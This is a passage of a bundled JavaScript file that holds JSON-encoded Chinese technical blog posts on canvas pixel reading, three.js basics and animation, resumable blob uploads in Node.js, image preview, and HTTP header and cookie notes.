class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  url=fr.result\\n  img.src = url\\n  <span class=\\"hljs-built_in\\">document</span>.body.appendChild(img)\\n}</code></pre></code></pre>\\n<h2 id=\\"getimagedata\\">getImageData</h2>\\n<p>获取canvas内部的像素点</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 获取整个画布的像素点</span>\\n<span class=\\"hljs-keyword\\">let</span> imgData=ctx.getImageData(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>, canvas.width, canvas.height)\\n\\n<span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> py = <span class=\\"hljs-number\\">0</span>; py &lt; canvas.height; py += <span class=\\"hljs-number\\">1</span>) {\\n  <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> px = <span class=\\"hljs-number\\">0</span>; px &lt; canvas.width; px += <span class=\\"hljs-number\\">1</span>) {\\n    <span class=\\"hljs-comment\\">// 检查透明的参数(0-255)，255为完全不透明</span>\\n    <span class=\\"hljs-keyword\\">let</span> i = (px + py * canvas.width) * <span class=\\"hljs-number\\">4</span> - <span class=\\"hljs-number\\">1</span>\\n    <span class=\\"hljs-keyword\\">const</span> pixel = imgData.data[i];\\n    <span class=\\"hljs-keyword\\">if</span> (pixel === <span class=\\"hljs-number\\">255</span>) {\\n      <span class=\\"hljs-comment\\">// do something</span>\\n    } \\n  }   \\n}</code></pre></code></pre>\\n","toc":[{"anchor":"foreignobject","level":2,"text":"foreignObject"},{"anchor":"getimagedata","level":2,"text":"getImageData"}],"relatedTags":null,"created_at":"2018-08-13","timeArr":[2018,7,13,0,0,0,0],"title":"svg渲染dom，canvas获取像素","uuid":"2d2fe99476f8b0fcf2a0f7ff6061756eff4803e5","summary":"<h4>foreignObject</h4>\\n<p>svg内部标签<code>&lt;foreignObject&gt;</code>，可以直接在svg内部插入<code>xhtml</code>元素，再通过<code>blob</code>和<code>FileReader</code>可\\n将内部<code>xhtml</code>内容转换成<em>同源</em>url，再通过<code>img.src=url</code>将svg内部的dom元素转化为图片。</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span>  d...</code></pre>","slug":"svg-xuan-ran-dom，canvas-huo-qu-xiang-su","sha":"8f6c34d738ca1b40e7dbc5fd7c069695a2fb4443"}')},642:function(n){n.exports=JSON.parse('{"content":"<p><code>threejs</code>初体验，关于<code>3D</code>渲染，自然会涉及到大量数学计算，算法公式，但这些<code>threejs</code>已经封装了，直接调用<code>API</code>即可完成大量工作。</p>\\n<p><code>threejs</code>用右手坐标系，即上<code>y</code>，右<code>x</code>，<code>z</code>轴从屏幕里到外</p>\\n<p><code>3D</code>渲染涉及概念</p>\\n<ol>\\n<li>场景</li>\\n</ol>\\n<p>指你想展示给别人看到东西总称，你想展示，需要添加到场景，不想展示，需要从场景中删除。</p>\\n<ol start=\\"2\\">\\n<li>摄像机</li>\\n</ol>\\n<p>指用户的视角，如果用户想看物体的后面，意思就是摄像机转到物体后面，<code>three-orbitcontrols</code>已经为我们封装了摄像机的鼠标操控。</p>\\n<ol start=\\"3\\">\\n<li>几何体(Geometry)</li>\\n</ol>\\n<p>指一些形状物体，如球体，正方体，圆锥，管道等等，<code>threejs</code>提供多种可以直接调用的形状。</p>\\n<ol start=\\"4\\">\\n<li>材质(Material)</li>\\n</ol>\\n<p>指物体表面的颜色，光亮，自定义皮肤(纹理）等</p>\\n<ol start=\\"5\\">\\n<li>Mesh</li>\\n</ol>\\n<p>一般来讲，<code>Mesh</code> 由 <code>Geometry</code> + <code>Material</code> 组合而成，想象一下，现在<code>几何体</code>有正方体和球体， <code>材质</code>有红色和蓝色，\\n那么<code>Mesh</code>能组合出红色正方体，蓝色正方体，红色球体，蓝色球体</p>\\n<ol start=\\"6\\">\\n<li>Group</li>\\n</ol>\\n<p>当你创建了多个<code>Mesh</code>后，可以用Group包裹部分，从而形成一个整体，面对移动，旋转等动画效果，可以整体而动</p>\\n<h4 id=\\"zui-jian-dan-de-chuang-jian-yi-ge-wu-ti\\">最简单的创建一个物体</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> boxGeo=<span class=\\"hljs-keyword\\">new</span> THREE.BoxBufferGeometry(width,height,depth)\\n<span class=\\"hljs-keyword\\">let</span> boxMat=<span class=\\"hljs-keyword\\">new</span> THREE.MeshStandardMaterial({\\n             <span class=\\"hljs-attr\\">color</span>: <span class=\\"hljs-string\\">\'#000000\'</span>,\\n             <span class=\\"hljs-attr\\">roughness</span>:<span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-comment\\">// 光滑的面</span>\\n           })\\n<span class=\\"hljs-keyword\\">let</span> boxObj=<span class=\\"hljs-keyword\\">new</span> THREE.Mesh( boxGeo, boxMat )</code></pre></code></pre>\\n","toc":[{"anchor":"zui-jian-dan-de-chuang-jian-yi-ge-wu-ti","level":4,"text":"最简单的创建一个物体"}],"relatedTags":null,"created_at":"2021-06-14","timeArr":[2021,5,14,0,0,0,0],"title":"threejs初体验-整体概念","uuid":"c9d2906be991ddcca334e52c1e30df138469d970","summary":"<p><code>threejs</code>初体验，关于<code>3D</code>渲染，自然会涉及到大量数学计算，算法公式，但这些<code>threejs</code>已经封装了，直接调用<code>API</code>即可完成大量工作。</p>\\n<p><code>threejs</code>用右手坐标系，即上<code>y</code>，右<code>x</code>，<code>z</code>轴从屏幕里到外</p>\\n<p><code>3D</code>渲染涉及概念</p>\\n<ol>\\n<li>场景</li>\\n</ol>\\n<p>指你想展示给别人看到东西总称，你想展示，需要添加...</p>","slug":"threejs-chu-ti-yan-zheng-ti-gai-nian","sha":"1bad457ab7f56d2fb13f92b70c3c3a7f2e14584a"}')},643:function(n){n.exports=JSON.parse('{"content":"<p>当创建出一个物体，我们想给他加点动画</p>\\n<p><code>threejs</code>的物体包含了<code>rotation</code>控制旋转，<code>position</code>和<code>translateOnAxis</code>控制位置</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>obj.rotation.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.position.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.translateOnAxis(<span class=\\"hljs-string\\">\'x\'</span>,<span class=\\"hljs-number\\">10</span>)</code></pre></code></pre>\\n<p>然后可以通过<code>requestAnimationFrame</code>来渲染动画</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">animate</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    obj.rotation.x=<span class=\\"hljs-built_in\\">Math</span>.PI / <span class=\\"hljs-number\\">180</span>\\n    requestAnimationFrame(animate)\\n}\\nrequestAnimationFrame(animate)</code></pre></code></pre>\\n<p>问题：</p>\\n<p>物体原点，默认物体原点是物体的中心点，如果让物体绕着某一个点，而非中心点来运动</p>\\n<p>这里可以使用<code>translateOnAxis</code>来处理，<code>translateOnAxis</code>是不改变物体原点的移动，<code>position</code>是改变物体原点的移动。</p>\\n<p>当一个物体使用<code>position</code>沿着<code>x</code>轴移动<code>10</code>，那么它的原点从原来的<code>(0,0,0)</code>来到了<code>(10,0,0)</code>\\n再使用<code>translateOnAxis</code>沿着<code>x</code>轴移动<code>-10</code>，它回到了初始点<code>(0,0,0)</code>，但原点不会改变，还是<code>(10,0,0)</code></p>\\n<p>这是再使用<code>rotation</code>进行旋转动画的时候，原点就到了<code>(10,0,0)</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>obj.position.x=<span class=\\"hljs-number\\">10</span>\\nobj.translateOnAxis(<span class=\\"hljs-string\\">\'x\'</span>,<span class=\\"hljs-number\\">-10</span>)\\nobj.rotation.x=<span class=\\"hljs-built_in\\">Math</span>.PI / <span class=\\"hljs-number\\">2</span></code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2021-06-16","timeArr":[2021,5,16,0,0,0,0],"title":"threejs创建简单动画","uuid":"02dc5ff17ce497cd5ef29f8b41b9a3ff1ff423eb","summary":"<p>当创建出一个物体，我们想给他加点动画</p>\\n<p><code>threejs</code>的物体包含了<code>rotation</code>控制旋转，<code>position</code>和<code>translateOnAxis</code>控制位置</p>\\n<pre class=\\"hljs\\"><code>obj.rotation.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.position.set(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">0</span>)\\nobj.translateOnAxis(<span class=\\"hljs-string\\">\'x...</span></code></pre>","slug":"threejs-chuang-jian-jian-dan-dong-hua","sha":"d2589656b12b3d6306e6652e24d6e97818213bf5"}')},644:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yi-ge-ke-zan-ting-fen-duan-shang-chuan-de-li-zi\\">一个可暂停分段上传的例子</h2>\\n<p><a href=\\"https://gist.github.com/stonehank/5d3dea234ac6bc200bdef9c181c0a645\\">代码位置</a></p>\\n<hr>\\n<p>要点：</p>\\n<ol>\\n<li><p>通过<code>blob.slice()</code>对文件进行分割，再逐个上传</p>\\n<p> <code>blob.slice(start, end, blob.type)</code></p>\\n</li>\\n<li><p>未使用表单，而是通过<code>FormData</code>(方便处理二进制)和<code>xhr</code>发送</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>   <span class=\\"hljs-keyword\\">let</span> fd = <span class=\\"hljs-keyword\\">new</span> FormData()\\n   fd.append(<span class=\\"hljs-string\\">\'name\'</span>, blob.name)\\n   fd.append(<span class=\\"hljs-string\\">\'start\'</span>, start)\\n   fd.append(<span class=\\"hljs-string\\">\'fragments\'</span>, cur);\\n   xhr.open(<span class=\\"hljs-string\\">\'POST\'</span>, <span class=\\"hljs-string\\">\'http://localhost:8080/upload.js\'</span>, <span class=\\"hljs-literal\\">true</span>);\\n   xhr.send(fd)</code></pre></code></pre>\\n</li>\\n<li><p>使用了<code>multiparty</code>，可以解析<code>FormData</code></p>\\n</li>\\n<li><p>通过传递start值和<code>fs.createWriteStream</code>对续传文件进行修改</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-comment\\">// r+ 表示修改而不是重写，r+不会自动创建不存在的文件</span>\\n writable=fs.createWriteStream(curFileName,{<span class=\\"hljs-attr\\">flags</span>:<span class=\\"hljs-string\\">\'r+\'</span>,<span class=\\"hljs-attr\\">start</span>:+start})\\n writable.write(content)</code></pre></code></pre>\\n<p> 判断文件是否存在(同步)：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">try</span> {\\n   fs.accessSync(curFileName);\\n } <span class=\\"hljs-keyword\\">catch</span> (err) {\\n   writable=fs.createWriteStream(curFileName)\\n }  </code></pre></code></pre>\\n</li>\\n</ol>\\n<p>遇到的一些问题：</p>\\n<ol>\\n<li><p>php使用环境(本地测试需要架设虚拟服务器)</p>\\n</li>\\n<li><p>xhr对二进制数据不能传递键值对(仅能传单个二进制数据)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">let</span> blob=<span class=\\"hljs-keyword\\">new</span> Blob([someContent])\\n\\n xhr.send(blob)  \\n <span class=\\"hljs-comment\\">// 后台直接写入文件便可，无须转换</span>\\n\\n xhr.send(<span class=\\"hljs-string\\">`name=<span class=\\"hljs-subst\\">${blob.name}</span>&amp;content=<span class=\\"hljs-subst\\">${blob}</span>`</span>)\\n <span class=\\"hljs-comment\\">// 这么传后台就无法解析content，始终是个[object Object]</span></code></pre></code></pre>\\n</li>\\n<li><p>通过FormData传递，有分隔符<code>-----</code>和一些编码，使用<code>querystring</code>无法解析，但使用php\\n作为后端好像不存在兼容问题。</p>\\n</li>\\n<li><p><code>multiparty</code>当解析函数使用了<code>cb</code>则无法监听它的<code>part</code>事件，因为全部说明内容都以键值对形式传递到<code>cb</code>里面了\\n，但是具体数据内容必须用<code>part</code>监听才能获取，数据获取方法和<code>res.on(&#39;data&#39;)</code>&amp;&amp;<code>res.on(&#39;end&#39;)</code>类似</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">let</span> form=<span class=\\"hljs-keyword\\">new</span> Multiparty.Form()\\n\\n <span class=\\"hljs-comment\\">// 情况1：数据流入此处，不会再触发底下的监听事件</span>\\n form.parse(req,<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">err, fields, files</span>)</span>{   \\n    <span class=\\"hljs-comment\\">/* ... */</span>   \\n });\\n\\n <span class=\\"hljs-comment\\">// 情况2：数据流入监听事件</span>\\n form.parse(req)\\n\\n form.on(<span class=\\"hljs-string\\">\'part\'</span>, <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">part</span>) </span>{\\n      part.on(<span class=\\"hljs-string\\">\'data\'</span>, <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">chunk</span>)</span>{   \\n        <span class=\\"hljs-comment\\">/* 情况2下，这里的chunk就是传入的分段数据 */</span>\\n      })\\n      part.on(<span class=\\"hljs-string\\">\'end\'</span>, <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n        <span class=\\"hljs-comment\\">/* ... */</span>\\n      })\\n })</code></pre></code></pre>\\n</li>\\n<li><p>xhr定义<code>responseType=&#39;json&#39;</code>，会自动将符合格式的回应值转换成json，\\n但不能使用<code>responseText</code>接收，使用<code>response</code>读取json</p>\\n<p>另外还有<code>responseXML</code>读取document</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"yi-ge-ke-zan-ting-fen-duan-shang-chuan-de-li-zi","level":2,"text":"一个可暂停分段上传的例子"}],"relatedTags":null,"created_at":"2018-07-26","timeArr":[2018,6,26,0,0,0,0],"title":"通过blob实现文件续传记录(nodejs)","uuid":"46e9b0a650dba0fd4351e6b9b36a76775bb0bc76","summary":"<h4>一个可暂停分段上传的例子</h4>\\n<p><a href=\\"https://gist.github.com/stonehank/5d3dea234ac6bc200bdef9c181c0a645\\">代码位置</a></p>","slug":"tong-guo-blob-shi-xian-wen-jian-xu-chuan-ji-lu-(nodejs)","sha":"f3a86b01ae6164f031e648596d9eeafb87fb28f6"}')},645:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"jie-xi-blob-shi-xian-tu-pian-yu-lan\\">解析blob实现图片预览</h2>\\n<p>原理很简单，<code>blob</code>是一个储存了二进制的大对象，而<code>createObjectURL</code>可以解析blob成为一个url格式，\\n再用<code>img</code>标签渲染即可。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">if</span>(blob.type.indexOf(<span class=\\"hljs-string\\">\'image\'</span>)!==<span class=\\"hljs-number\\">-1</span>){\\n    newURL=<span class=\\"hljs-built_in\\">window</span>.URL.createObjectURL(blob)\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>\\n  }<span class=\\"hljs-keyword\\">else</span>{\\n    alert(<span class=\\"hljs-string\\">\\"选择图片\\"</span>)\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span></code></pre></code></pre>\\n<p>注意：<code>input type=file</code>标签的属性files就是blob对象的集合，不需要再另外创建blob对象。</p>\\n<p>另外，还可以使用<code>FileReader</code>对blob进行解析，其中也包括解析成url格式</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> fr=<span class=\\"hljs-keyword\\">new</span> FileReader()\\n  <span class=\\"hljs-keyword\\">if</span>(blob.type.indexOf(<span class=\\"hljs-string\\">\'image\'</span>)!==<span class=\\"hljs-number\\">-1</span>){\\n    fr.readAsDataURL(blob);\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>\\n  }<span class=\\"hljs-keyword\\">else</span>{\\n    alert(<span class=\\"hljs-string\\">\\"选择图片\\"</span>)\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span></code></pre></code></pre>\\n<p>但由于<code>FileReader</code>的解析过程使异步的，必须在它的监听函数内调用解析值<code>result</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>fr.onload=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  newURL=fr.result\\n  createIMG()\\n}</code></pre></code></pre>\\n<p>代码地址：<a href=\\"https://gist.github.com/stonehank/113b2164e4c7fc4bdefdab96d34ad917\\">https://gist.github.com/stonehank/113b2164e4c7fc4bdefdab96d34ad917</a></p>\\n","toc":[{"anchor":"jie-xi-blob-shi-xian-tu-pian-yu-lan","level":2,"text":"解析blob实现图片预览"}],"relatedTags":null,"created_at":"2018-07-25","timeArr":[2018,6,25,0,0,0,0],"title":"通过解析blob实现图片预览","uuid":"c210dfbee9273c04ed715f0cf70a75b648672b17","summary":"<h4>解析blob实现图片预览</h4>\\n<p>原理很简单，<code>blob</code>是一个储存了二进制的大对象，而<code>createObjectURL</code>可以解析blob成为一个url格式，\\n再用<code>img</code>标签渲染即可。</p>\\n<pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">if</span>(blob.type.indexOf(<span class=\\"hljs-string\\">\'image\'</span>)!==<span class=\\"hljs-number\\">-1</span>){\\n    newURL=<span class=\\"hljs-built_in\\">window</span>.U...</code></pre>","slug":"tong-guo-jie-xi-blob-shi-xian-tu-pian-yu-lan","sha":"bf946078e90730d7d626fe3573c4adad5f9cd0e2"}')},646:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>TCP/IP分为4个层</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th align=\\"center\\">名称</th>\\n<th align=\\"center\\">代表</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td align=\\"center\\">应用层</td>\\n<td align=\\"center\\">HTTP</td>\\n</tr>\\n<tr>\\n<td align=\\"center\\">传输层</td>\\n<td align=\\"center\\">TCP</td>\\n</tr>\\n<tr>\\n<td align=\\"center\\">网络层</td>\\n<td align=\\"center\\">IP</td>\\n</tr>\\n<tr>\\n<td align=\\"center\\">链路层</td>\\n<td align=\\"center\\"></td>\\n</tr>\\n</tbody></table>\\n<ul>\\n<li><p>HTTP协议</p>\\n<ul>\\n<li>生成请求提交(客户端)</li>\\n<li>处理请求(服务端)</li>\\n</ul>\\n</li>\\n<li><p>DNS协议</p>\\n<ul>\\n<li>根据域名查找IP</li>\\n</ul>\\n</li>\\n<li><p>TCP协议</p>\\n<ul>\\n<li><p>分割数据</p>\\n</li>\\n<li><p>确保传输成功(客户端)</p>\\n<p>  <code>使用3次握手</code></p>\\n</li>\\n<li><p>确保接受成功(服务端)</p>\\n</li>\\n<li><p>合并数据</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>IP协议</p>\\n<p>  中转+传送</p>\\n<ul>\\n<li>IP地址</li>\\n<li>Mac地址</li>\\n<li>ARP(通过IP地址反查Mac地址)</li>\\n</ul>\\n</li>\\n<li><p>URI：资源的标识(http,ft,file...)</p>\\n</li>\\n<li><p>URL：资源地址(http)</p>\\n</li>\\n</ul>\\n<hr>\\n<p>Http请求方法：</p>\\n<ul>\\n<li>GET：获取资源</li>\\n<li>POST：传输实体主体</li>\\n<li>PUT：传输文件(无验证机制)</li>\\n<li>HEAD：获得报文首部</li>\\n<li>DELETE：删除文件</li>\\n<li>OPTIONS：询问支持的方法</li>\\n<li>TRACE：追踪路径</li>\\n<li>CONNECT：要求用隧道协议连接代理</li>\\n</ul>\\n<hr>\\n<blockquote>\\n<p>单次连接：每个请求一次连接</p>\\n</blockquote>\\n<blockquote>\\n<p>持久连接：多个请求一次连接</p>\\n<blockquote>\\n<p>管线化：多个内容一次请求</p>\\n</blockquote>\\n</blockquote>\\n<hr>\\n<p>状态码：</p>\\n<ul>\\n<li><p>206：部分请求，搭配<code>Content-Range</code>使用</p>\\n</li>\\n<li><p>302：临时重定向，规则上定义不能改变<code>method</code></p>\\n</li>\\n<li><p>303：临时重定向，规则上定义重定向使用<code>GET</code></p>\\n</li>\\n<li><p>304：允许访问资源，但不符合条件</p>\\n<p>  例如<code>If-Modified-Since</code>，服务端发现请求提供的<code>最后修改日期</code>和服务端的<code>最后修改日期</code>一致，则返回304.</p>\\n</li>\\n<li><p>307：与302的区别在于，确保请求方法和消息主体不会发生变化</p>\\n</li>\\n</ul>\\n<hr>\\n<p>代理、网关、隧道</p>\\n<ul>\\n<li><p>代理：处理双边的信息交互，每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息</p>\\n</li>\\n<li><p>网关：网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供<code>非 HTTP 协议</code>服务。</p>\\n</li>\\n<li><p>隧道：隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。</p>\\n</li>\\n</ul>\\n<hr>\\n<p>HTTP 通用首部字段</p>\\n<ul>\\n<li>Cache-Control</li>\\n</ul>\\n<ol>\\n<li><p>缓存请求指令</p>\\n<table>\\n<thead>\\n<tr>\\n<th>指令</th>\\n<th>参数</th>\\n<th>说明</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td><strong>no-cache</strong></td>\\n<td>无</td>\\n<td>不使用缓存的内容，强制向源服务器再次验证</td>\\n</tr>\\n<tr>\\n<td><strong>no-store</strong></td>\\n<td>无</td>\\n<td>不缓存请求或响应的任何内容</td>\\n</tr>\\n<tr>\\n<td>max-age = [ 秒]</td>\\n<td>必需</td>\\n<td>响应的最大Age值</td>\\n</tr>\\n<tr>\\n<td>max-stale( = [ 秒])</td>\\n<td>可省略</td>\\n<td>接收已过期的响应</td>\\n</tr>\\n<tr>\\n<td>min-fresh = [ 秒]</td>\\n<td>必需</td>\\n<td>期望在指定时间内的响应仍有效</td>\\n</tr>\\n<tr>\\n<td>no-transform</td>\\n<td>无</td>\\n<td>代理不可更改媒体类型</td>\\n</tr>\\n<tr>\\n<td>only-if-cached</td>\\n<td>无</td>\\n<td>从缓存获取资源</td>\\n</tr>\\n<tr>\\n<td>cache-extension</td>\\n<td>-</td>\\n<td>新指令标记（token）</td>\\n</tr>\\n</tbody></table>\\n</li>\\n<li><p>缓存响应指令</p>\\n<table>\\n<thead>\\n<tr>\\n<th>指令</th>\\n<th>参数</th>\\n<th>说明</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>public</td>\\n<td>无</td>\\n<td>可向任意方提供响应的缓存</td>\\n</tr>\\n<tr>\\n<td>private</td>\\n<td>可省略</td>\\n<td>仅向特定用户返回响应</td>\\n</tr>\\n<tr>\\n<td>no-cache</td>\\n<td>可省略</td>\\n<td>允许缓存，缓存前必须先确认其有效性</td>\\n</tr>\\n<tr>\\n<td>no-store</td>\\n<td>无</td>\\n<td>不缓存请求或响应的任何内容</td>\\n</tr>\\n<tr>\\n<td>no-transform</td>\\n<td>无</td>\\n<td>代理不可更改媒体类型</td>\\n</tr>\\n<tr>\\n<td>must-revalidate</td>\\n<td>无</td>\\n<td>必须再向源服务器进行确认当前缓存是否有效，再确定是否使用</td>\\n</tr>\\n<tr>\\n<td>proxy-revalidate</td>\\n<td>无</td>\\n<td>要求中间缓存服务器对缓存的响应有效性再进行确认</td>\\n</tr>\\n<tr>\\n<td>max-age = [ 秒]</td>\\n<td>必需</td>\\n<td>响应的最大Age值，1.1<code>max-age</code>优先，1.0<code>Expires</code>优先</td>\\n</tr>\\n<tr>\\n<td>s-maxage = [ 秒]</td>\\n<td>必需</td>\\n<td>公共缓存服务器响应的最大Age值</td>\\n</tr>\\n<tr>\\n<td>cache-extension</td>\\n<td>-</td>\\n<td>新指令标记（token）</td>\\n</tr>\\n</tbody></table>\\n</li>\\n</ol>\\n<ul>\\n<li><p>Transfer-Encoding</p>\\n<p>  规定了传输报文主体时采用的编码方式</p>\\n</li>\\n</ul>\\n<hr>\\n<p>HTTP 请求首部字段</p>\\n<ul>\\n<li><p>Accept：允许接受的格式</p>\\n<p>  可使用<code>q=</code>定义权重(范围0~1，3位小数)，默认1.0。</p>\\n<p>  首先返回权重值最高的媒体类型</p>\\n</li>\\n<li><p>Accept-Encoding：支持的内容编码</p>\\n<ul>\\n<li>gzip</li>\\n<li>compress</li>\\n<li>deflate</li>\\n<li>identity：不执行压缩或不会变化的默认编码格式</li>\\n</ul>\\n</li>\\n<li><p>Expect：告知服务器，期望出现的某种特定行为，1.1只定义了<code>100-continue</code></p>\\n</li>\\n<li><p>If-Modified-Since：请求字段的日期后如果有更新，执行请求，否则返回状态码 304 Not Modified 的响应</p>\\n</li>\\n<li><p>If-Match和If-Range(搭配字段Range)：</p>\\n<p>  如果<code>If-Match</code>对应的<code>ETag</code>不符合，返回状态码<code>412 Precondition Failed</code>，需要再次请求</p>\\n<p>  如果<code>If-Range</code>对应的<code>Etag</code>不符合，会返回所有内容<code>200</code>，否则返回<code>Range</code>请求的部分内容<code>206</code></p>\\n</li>\\n<li><p>Max-Forwards：定义最多转发的次数</p>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-14","timeArr":[2018,10,14,0,0,0,0],"title":"图解Http大纲笔记(1)","uuid":"cd67e255a685952b6e3ba3efb90befd0197d1fe4","summary":"<ul>\\n<li>TCP/IP分为4个层</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th style=\\"text-align:center\\">名称</th>\\n<th style=\\"text-align:center\\">代表</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td style=\\"text-align:center\\">应用层</td>\\n<td style=\\"text-align:center\\">HTTP</td>\\n</tr>\\n<tr>\\n<td style=\\"text-align:center\\">传输层</td>\\n<td style=\\"text-align:center\\">TCP</td>\\n</tr>\\n<tr>\\n<td style=\\"text-align:center\\">网络层</td>\\n<td style=\\"text-align:center\\">IP</td>\\n</tr>\\n<tr>\\n<td style=\\"text-align:center\\">链路层</td>\\n<td style=\\"text-align:center\\"></td>\\n</tr>\\n</tbody>\\n</table>\\n<ul>\\n<li>\\n<p>HTTP协议</p>\\n<ul>\\n<li>生成请求提交(客户端)</li>\\n<li>处理请求(服务端)</li>\\n</ul>\\n</li>\\n<li>\\n<p>DNS协议</p>\\n<ul>\\n<li>根据域名查找IP</li>\\n</ul>\\n</li>\\n<li>\\n<p>TCP...</p>\\n</li>\\n</ul>","slug":"tu-jie-Http-da-gang-bi-ji-(1)","sha":"a606cff58ed32d4564139956743675e9c438e11a"}')},647:function(n){n.exports=JSON.parse('{"content":"<p>实体首部字段</p>\\n<ul>\\n<li>Content-Encoding：实体编码方式(gzip, compress, deflate, identity)</li>\\n<li>Content-Location：报文主体返回资源对应的 URI(不一定是请求URI)。</li>\\n<li>Content-Range：匹配部分。</li>\\n<li>Content-Type：实体内对象的媒体类型。</li>\\n<li>Last-Modified：指明资源最终修改的时间。</li>\\n</ul>\\n<hr>\\n<p>Cookie相关字段</p>\\n<table>\\n<thead>\\n<tr>\\n<th>首部字段名</th>\\n<th>说明</th>\\n<th>首部类型</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>Set-Cookie</td>\\n<td>开始状态管理所使用的Cookie信息</td>\\n<td>响应首部字段</td>\\n</tr>\\n<tr>\\n<td>Cookie</td>\\n<td>服务器接收到的Cookie信息</td>\\n<td>请求首部字段</td>\\n</tr>\\n</tbody></table>\\n<ul>\\n<li><p>Set-Cookie</p>\\n<p>  <code>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path=/; domain=.hackr.jp;</code></p>\\n</li>\\n<li><p>Set-Cookie 字段的属性</p>\\n</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th>属性</th>\\n<th>说明</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>NAME=VALUE</td>\\n<td>赋予 Cookie 的名称和其值（必需项）</td>\\n</tr>\\n<tr>\\n<td>expires=DATE</td>\\n<td>Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）</td>\\n</tr>\\n<tr>\\n<td>path=PATH</td>\\n<td>将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td>\\n</tr>\\n<tr>\\n<td>domain=域名</td>\\n<td>作为 Cookie 适用对象的域名 （若不指定则默认为创建 Cookie的服务器的域名）</td>\\n</tr>\\n<tr>\\n<td>Secure</td>\\n<td>仅在 HTTPS 安全通信时才会发送 Cookie</td>\\n</tr>\\n<tr>\\n<td>HttpOnly</td>\\n<td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td>\\n</tr>\\n</tbody></table>\\n<ul>\\n<li><p>Cookie：status=enable</p>\\n</li>\\n<li><p>DNT：属于 HTTP 请求首部，为<code>1</code>拒绝个人信息被征集，<code>0</code>允许。</p>\\n</li>\\n</ul>\\n<hr>\\n<p>HTTP 的不足</p>\\n<ul>\\n<li>通信使用明文（不加密），内容可能会被窃听<ul>\\n<li>TCP/IP 是可能被窃听的网络（即便不使用明文）</li>\\n<li>通信的加密 （HTTPS)</li>\\n<li>内容的加密 